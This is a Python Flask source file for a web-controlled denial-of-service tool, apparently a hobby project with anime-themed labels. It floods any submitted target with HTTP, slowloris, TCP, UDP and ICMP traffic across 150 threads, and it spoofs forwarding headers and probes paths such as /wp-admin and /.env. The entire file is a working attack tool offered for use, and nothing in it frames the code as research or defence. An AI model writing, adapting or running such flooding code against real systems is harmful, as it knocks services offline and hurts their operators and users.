#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
import threading
import socket
import random
import requests
import time
import json
from datetime import datetime

app = Flask(__name__)

# Global stats
attack_stats = {
    'running': False,
    'target': '',
    'port': 12000,
    'method': 'None',
    'total_packets': 0,
    'total_bytes': 0,
    'active_threads': 0,
    'rps': 0,
    'start_time': None
}

attack_threads = []
attack_running = False

methods_map = {
    'http': 'HTTP FLOOD',
    'slowloris': 'SLOWLORIS',
    'tcp': 'TCP FLOOD',
    'udp': 'UDP FLOOD',
    'syn': 'SYN FLOOD',
    'icmp': 'ICMP FLOOD',
    'hades': 'HADES MODE (ALL)'
}

def http_flood(target, port):
    urls = [
        f"http://{target}:{port}/",
        f"http://{target}:{port}/wp-admin",
        f"http://{target}:{port}/api",
        f"http://{target}:{port}/login",
        f"http://{target}:{port}/admin",
        f"http://{target}:{port}/.env"
    ]
    headers = [
        {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},
        {'User-Agent': 'KawaiiBot/1.0', 'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"},
        {'User-Agent': 'AnimeGirl/2.0', 'Accept': 'text/html,application/xhtml+xml'},
        {'User-Agent': 'DDOS-Attack-Suite/3.0', 'X-Real-IP': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"}
    ]
    while attack_stats['running']:
        try:
            url = random.choice(urls)
            header = random.choice(headers)
            requests.get(url, headers=header, timeout=2, verify=False)
            attack_stats['total_packets'] += 1
            attack_stats['total_bytes'] += 512
        except:
            pass

def slowloris(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(2)
        sock.connect((target, port))
        sock.send(f"GET /?{random.randint(0, 9999)} HTTP/1.1\r\n".encode())
        sock.send(f"Host: {target}\r\n".encode())
        sock.send("User-Agent: Mozilla/5.0\r\n".encode())
        sock.send("Accept-language: en-US,en;q=0.5\r\n".encode())
        
        while attack_stats['running']:
            sock.send(f"X-Random-{random.randint(0, 9999)}: {random.randint(0, 9999)}\r\n".encode())
            attack_stats['total_packets'] += 1
            attack_stats['total_bytes'] += 64
            time.sleep(5)
    except:
        pass

def tcp_flood(target, port):
    while attack_stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((target, port))
            payload = random._urandom(1024)
            for _ in range(100):
                sock.send(payload)
                attack_stats['total_packets'] += 1
                attack_stats['total_bytes'] += len(payload)
            sock.close()
        except:
            pass

def udp_flood(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while attack_stats['running']:
        payload = random._urandom(65500)
        sock.sendto(payload, (target, port))
        attack_stats['total_packets'] += 1
        attack_stats['total_bytes'] += 65500

def syn_flood(target, port):
    tcp_flood(target, port)

def icmp_flood(target, port):
    while attack_stats['running']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            packet = b'\x08\x00' + b'\x00\x00' + b'\x00\x01' + b'\x00\x02' + random._urandom(64)
            sock.sendto(packet, (target, 0))
            attack_stats['total_packets'] += 1
            attack_stats['total_bytes'] += 64
        except:
            pass

def hades_mode(target, port):
    methods = [http_flood, slowloris, tcp_flood, udp_flood, syn_flood, icmp_flood]
    while attack_stats['running']:
        random.choice(methods)(target, port)

def start_attack_engine(target, port, method):
    global attack_threads
    attack_stats['running'] = True
    attack_stats['target'] = target
    attack_stats['port'] = port
    attack_stats['method'] = methods_map.get(method, 'UNKNOWN')
    attack_stats['start_time'] = datetime.now().isoformat()
    
    method_func = {
        'http': http_flood,
        'slowloris': slowloris,
        'tcp': tcp_flood,
        'udp': udp_flood,
        'syn': syn_flood,
        'icmp': icmp_flood,
        'hades': hades_mode
    }.get(method, http_flood)
    
    for i in range(150):
        t = threading.Thread(target=method_func, args=(target, port))
        t.daemon = True
        t.start()
        attack_threads.append(t)
        attack_stats['active_threads'] = i + 1

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/start', methods=['POST'])
def start_attack():
    global attack_stats, attack_threads, attack_running
    
    if attack_stats['running']:
        return jsonify({'error': 'Attack already running!'}), 400
    
    data = request.json
    target = data.get('target')
    port = int(data.get('port', 12000))
    method = data.get('method', 'http')
    
    if not target:
        return jsonify({'error': 'Target required!'}), 400
    
    # Reset stats
    attack_stats['total_packets'] = 0
    attack_stats['total_bytes'] = 0
    attack_stats['active_threads'] = 0
    attack_stats['rps'] = 0
    attack_threads = []
    
    # Start attack in background
    thread = threading.Thread(target=start_attack_engine, args=(target, port, method))
    thread.daemon = True
    thread.start()
    
    return jsonify({'message': f'Attack started on {target}:{port} with {method}'})

@app.route('/api/stop', methods=['POST'])
def stop_attack():
    global attack_stats, attack_threads
    attack_stats['running'] = False
    attack_stats['active_threads'] = 0
    attack_threads = []
    return jsonify({'message': 'Attack stopped!'})

@app.route('/api/stats', methods=['GET'])
def get_stats():
    # Calculate RPS
    return jsonify({
        'running': attack_stats['running'],
        'target': attack_stats['target'],
        'port': attack_stats['port'],
        'method': attack_stats['method'],
        'total_packets': attack_stats['total_packets'],
        'total_bytes': attack_stats['total_bytes'],
        'total_mb': round(attack_stats['total_bytes'] / 1024 / 1024, 2),
        'active_threads': attack_stats['active_threads'],
        'start_time': attack_stats['start_time']
    })

if __name__ == '__main__':
    print("🌸 Anime DDoS Web Control Starting...")
    print(f"💻 Open browser at: http://localhost:5000")
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
